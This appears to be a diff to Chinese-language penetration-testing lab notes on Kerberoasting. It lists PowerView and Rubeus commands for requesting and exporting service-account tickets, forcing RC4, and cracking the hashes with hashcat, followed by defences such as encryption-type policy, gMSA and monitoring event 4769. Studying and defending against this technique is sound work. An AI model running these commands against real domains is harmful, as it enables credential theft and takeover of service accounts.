@@ -56,6 +56,41 @@ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 Windows自动化工具
 C:\htb> Import-Module .\PowerView.ps1      导入module
 C:\htb> Get-DomainUser * -spn | select samaccountname      枚举SPN账户
+C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation     拿sqldev用户的票据，以 Hashcat 格式，导出到ilfreight_tgs.csv
 
+GhostPack 的 Rubeus 来更快
+一些选项包括：
+执行 Kerberoasting 并将哈希输出到文件
+使用备用凭据
+将 Kerberoasting 与票据传递 (pass-the-ticket) 攻击相结合
+执行“操作安全 (opsec)” Kerberoasting，以过滤掉启用 AES 的账户
+为在特定日期范围内设置密码的账户请求票据
+对请求的票据数量设置限制
+执行 AES Kerberoasting
+  https://github.com/GhostPack/Rubeus
+如果看到任何 SPN 账户的密码是在 2016 年前设置的，它们可能是很有希望的目标，因为它们可能有一个在组织尚不成熟时设置且从未更改过的弱密码，Server 2016 或更早版本上允许请求 RC4
+C:\htb> .\Rubeus.exe      启动，并显示选项
+C:\htb> .\Rubeus.exe kerberoast /stats      攻击后统计信息
+C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+admincount=1 代表曾经或现在属于受保护组
+/nowrap 相当于echo "<base64 blob>" |  tr -d \\n
+C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap      攻击testspn用户
+C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes      查看指定Properties
+  https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797
+hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt      破解RC4哈希      $krb5tgs$23$
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt      破解AES128       $krb5tgs$18$
+C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap      支请求RC4，可能是 Active Directory 中为了向后兼容性而内置的一个故障保护机制
+防御
+可以编辑 Kerberos 使用的加密类型
+打开组策略，编辑默认域策略
+并选择：Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
+双击Network security: Configure encryption types allowed for Kerberos
+选择 Kerberos 允许的所需加密类型
+
+设置一个长而复杂的密码
+使用托管服务账户 (MSA)和组托管服务账户 (gMSA)，它们使用非常复杂的密码，并按设定的时间间隔自动轮换
+监控频繁的4769事件
+  https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769
+more      https://adsecurity.org/?p=3458
 
 
